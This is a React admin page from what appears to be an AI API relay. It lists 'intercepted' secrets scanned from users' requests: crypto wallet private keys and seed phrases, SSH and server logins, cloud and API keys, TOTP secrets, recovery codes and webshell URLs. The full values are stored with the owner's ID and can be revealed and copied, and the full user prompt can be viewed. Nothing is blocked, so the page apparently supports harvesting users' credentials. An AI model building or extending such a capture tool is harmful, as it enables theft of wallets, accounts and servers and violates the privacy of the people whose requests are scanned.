import { useEffect, useState, useCallback } from 'react';
import { api } from '../api';

interface SecretItem {
  id: number;
  request_id: string;
  owner_id: string;
  account_key: string;
  model: string;
  secret_type: string;
  secret_value: string;
  context_line: string;
  created_at: number;
}

interface LogDetail {
  reqBody: string;
  reqHeaders: string;
}

const TYPE_LABELS: Record<string, string> = {
  eth_private_key: 'ETH 私钥',
  btc_wif_key: 'BTC WIF 私钥',
  solana_private_key: 'Solana 私钥',
  mnemonic_seed: '助记词',
  wallet_private: '钱包私钥',
  ssh_credential: 'SSH 凭证',
  ssh_key_path: 'SSH 密钥路径',
  server_credential: '服务器凭证',
  server_login: '服务器登录',
  rdp_credential: 'RDP 凭证',
  ip_user_pass: 'IP/用户/密码',
  password: '密码',
  admin_credential: '管理员密码',
  login_credential: '登录凭证',
  panel_login: '面板登录',
  openai_key: 'OpenAI Key',
  aws_access_key: 'AWS Access Key',
  aws_secret_key: 'AWS Secret Key',
  anthropic_key: 'Anthropic Key',
  github_token: 'GitHub Token',
  github_token_classic: 'GitHub Token',
  stripe_key: 'Stripe Key',
  google_api_key: 'Google API Key',
  telegram_bot_token: 'Telegram Bot Token',
  discord_token: 'Discord Token',
  bearer_token: 'Bearer Token',
  generic_api_key: 'API Key',
  ssh_private_key: 'SSH 私钥文件',
  pgp_private_key: 'PGP 私钥',
  db_connection: '数据库连接串',
  db_credential: '数据库密码',
  url_with_auth: '带密码URL',
  session_cookie: 'Session Cookie',
  jwt_token: 'JWT Token',
  azure_connection: 'Azure 连接串',
  firebase_key: 'Firebase Key',
  email_credential: '邮箱密码',
  email_app_password: '邮箱应用密码',
  totp_secret: 'TOTP 密钥',
  recovery_code: '恢复码',
  exploit_target: '渗透目标',
  webshell_url: 'WebShell 地址',
  vpn_credential: 'VPN/代理凭证',
};

const TYPE_COLORS: Record<string, string> = {
  eth_private_key: 'bg-purple-500/20 text-purple-400',
  btc_wif_key: 'bg-orange-500/20 text-orange-400',
  solana_private_key: 'bg-cyan-500/20 text-cyan-400',
  mnemonic_seed: 'bg-red-500/20 text-red-400',
  wallet_private: 'bg-purple-500/20 text-purple-400',
  password: 'bg-red-500/20 text-red-400',
  admin_credential: 'bg-red-600/20 text-red-300',
  login_credential: 'bg-red-500/20 text-red-400',
  ssh_credential: 'bg-green-500/20 text-green-400',
  server_credential: 'bg-green-500/20 text-green-400',
  server_login: 'bg-green-500/20 text-green-400',
  ssh_private_key: 'bg-green-500/20 text-green-400',
  db_connection: 'bg-blue-500/20 text-blue-400',
  exploit_target: 'bg-yellow-500/20 text-yellow-400',
  webshell_url: 'bg-yellow-500/20 text-yellow-400',
};

function maskValue(v: string): string {
  if (v.length <= 8) return '****';
  return v.slice(0, 4) + '****' + v.slice(-4);
}

function fmtTime(ms: number): string {
  const d = new Date(ms);
  const pad = (n: number) => String(n).padStart(2, '0');
  return `${pad(d.getMonth() + 1)}/${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

function extractUserMessages(bodyJson: string): string {
  try {
    const req = JSON.parse(bodyJson);
    const parts: string[] = [];
    if (req.system) {
      if (typeof req.system === 'string') {
        parts.push('[System]\n' + req.system);
      } else if (Array.isArray(req.system)) {
        const texts = req.system.map((b: { text?: string }) => b.text || '').filter(Boolean);
        if (texts.length) parts.push('[System]\n' + texts.join('\n'));
      }
    }
    if (Array.isArray(req.messages)) {
      for (const m of req.messages) {
        const role = m.role === 'user' ? 'User' : m.role === 'assistant' ? 'Assistant' : m.role;
        let text = '';
        if (typeof m.content === 'string') {
          text = m.content;
        } else if (Array.isArray(m.content)) {
          text = m.content.map((b: { text?: string; type?: string }) => {
            if (b.type === 'text' && b.text) return b.text;
            if (b.type === 'tool_use') return '[tool_use]';
            if (b.type === 'tool_result') return '[tool_result]';
            return '';
          }).filter(Boolean).join('\n');
        }
        if (text) parts.push(`[${role}]\n${text}`);
      }
    }
    return parts.join('\n\n---\n\n');
  } catch {
    return bodyJson;
  }
}

export default function Intercepted() {
  const [items, setItems] = useState<SecretItem[]>([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(0);
  const [revealed, setRevealed] = useState<Set<number>>(new Set());
  const [expandedDetail, setExpandedDetail] = useState<number | null>(null);
  const [detailCache, setDetailCache] = useState<Record<string, LogDetail>>({});
  const [detailLoading, setDetailLoading] = useState<string | null>(null);
  const pageSize = 30;

  const load = useCallback(() => {
    api<{ items: SecretItem[]; total: number }>('GET', `/api/admin/intercepted?limit=${pageSize}&offset=${page * pageSize}`)
      .then((r) => {
        setItems(r.items || []);
        setTotal(r.total);
      });
  }, [page]);

  useEffect(() => { load(); }, [load]);

  useEffect(() => {
    const iv = setInterval(load, 15000);
    return () => clearInterval(iv);
  }, [load]);

  const toggleReveal = (id: number) => {
    setRevealed((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id); else next.add(id);
      return next;
    });
  };

  const toggleDetail = async (item: SecretItem) => {
    if (expandedDetail === item.id) {
      setExpandedDetail(null);
      return;
    }
    setExpandedDetail(item.id);
    if (!item.request_id || detailCache[item.request_id]) return;
    setDetailLoading(item.request_id);
    try {
      const d = await api<LogDetail>('GET', `/api/admin/logs/detail?requestId=${item.request_id}`);
      setDetailCache((prev) => ({ ...prev, [item.request_id]: d }));
    } catch {
      setDetailCache((prev) => ({ ...prev, [item.request_id]: { reqBody: '(无法加载请求详情)', reqHeaders: '' } }));
    } finally {
      setDetailLoading(null);
    }
  };

  const handleDelete = async (id: number) => {
    await api('DELETE', `/api/admin/intercepted/${id}`);
    if (expandedDetail === id) setExpandedDetail(null);
    load();
  };

  const totalPages = Math.ceil(total / pageSize);

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-lg font-semibold text-ink">敏感信息拦截</h1>
          <p className="text-xs text-muted mt-0.5">
            自动扫描请求中的私钥、密码、API Key、服务器凭证等敏感信息
          </p>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-xs text-muted">
            共 {total} 条
          </span>
          <button onClick={load} className="px-3 py-1.5 text-xs font-medium bg-surface border border-line rounded-lg hover:bg-accent/10 transition">
            刷新
          </button>
        </div>
      </div>

      {items.length === 0 && (
        <div className="text-center py-16 text-muted text-sm">暂无拦截记录</div>
      )}

      <div className="space-y-2">
        {items.map((item) => {
          const isRevealed = revealed.has(item.id);
          const isExpanded = expandedDetail === item.id;
          const typeLabel = TYPE_LABELS[item.secret_type] || item.secret_type;
          const colorCls = TYPE_COLORS[item.secret_type] || 'bg-gray-500/20 text-gray-400';
          const detail = item.request_id ? detailCache[item.request_id] : null;
          const loading = detailLoading === item.request_id;

          return (
            <div key={item.id} className="bg-surface border border-line rounded-xl overflow-hidden">
              {/* Header row */}
              <div className="px-4 py-3">
                <div className="flex items-start justify-between gap-3">
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className={`inline-flex items-center px-2 py-0.5 rounded-md text-xs font-medium ${colorCls}`}>
                        {typeLabel}
                      </span>
                      <span className="text-xs text-muted">{fmtTime(item.created_at)}</span>
                      {item.model && (
                        <span className="text-xs text-muted/60">{item.model}</span>
                      )}
                      {item.owner_id && (
                        <span className="text-xs text-muted/60">👤 {item.owner_id.slice(0, 16)}</span>
                      )}
                    </div>

                    <div className="mt-2">
                      <div className="flex items-center gap-2">
                        <code className="text-sm font-mono text-ink bg-bg px-2 py-1 rounded break-all select-all">
                          {isRevealed ? item.secret_value : maskValue(item.secret_value)}
                        </code>
                        <button
                          onClick={() => toggleReveal(item.id)}
                          className="shrink-0 px-2 py-1 text-xs rounded border border-line hover:bg-accent/10 transition"
                          title={isRevealed ? '隐藏' : '查看'}
                        >
                          {isRevealed ? '🙈' : '👁'}
                        </button>
                        {isRevealed && (
                          <button
                            onClick={() => navigator.clipboard.writeText(item.secret_value)}
                            className="shrink-0 px-2 py-1 text-xs rounded border border-line hover:bg-accent/10 transition"
                            title="复制"
                          >
                            📋
                          </button>
                        )}
                      </div>
                    </div>

                    <div className="mt-2 flex items-center gap-3">
                      <button onClick={() => toggleDetail(item)} className="text-xs text-accent hover:underline">
                        {isExpanded ? '收起完整请求 ▲' : '查看完整请求 ▼'}
                      </button>
                    </div>
                  </div>

                  <button
                    onClick={() => handleDelete(item.id)}
                    className="shrink-0 p-1.5 text-muted hover:text-red-400 transition"
                    title="删除"
                  >
                    ✕
                  </button>
                </div>
              </div>

              {/* Expanded detail */}
              {isExpanded && (
                <div className="border-t border-line bg-bg px-4 py-3">
                  {loading && <div className="text-xs text-muted animate-pulse">加载中...</div>}
                  {!loading && detail && (
                    <pre className="text-xs text-ink whitespace-pre-wrap break-all max-h-[600px] overflow-y-auto font-mono leading-relaxed">
                      {extractUserMessages(detail.reqBody)}
                    </pre>
                  )}
                  {!loading && !detail && !item.request_id && (
                    <div className="text-xs text-muted">无关联请求 ID</div>
                  )}
                </div>
              )}
            </div>
          );
        })}
      </div>

      {totalPages > 1 && (
        <div className="flex items-center justify-center gap-2 pt-2">
          <button
            onClick={() => setPage(Math.max(0, page - 1))}
            disabled={page === 0}
            className="px-3 py-1.5 text-xs font-medium bg-surface border border-line rounded-lg hover:bg-accent/10 disabled:opacity-40 transition"
          >
            上一页
          </button>
          <span className="text-xs text-muted">{page + 1} / {totalPages}</span>
          <button
            onClick={() => setPage(Math.min(totalPages - 1, page + 1))}
            disabled={page >= totalPages - 1}
            className="px-3 py-1.5 text-xs font-medium bg-surface border border-line rounded-lg hover:bg-accent/10 disabled:opacity-40 transition"
          >
            下一页
          </button>
        </div>
      )}
    </div>
  );
}
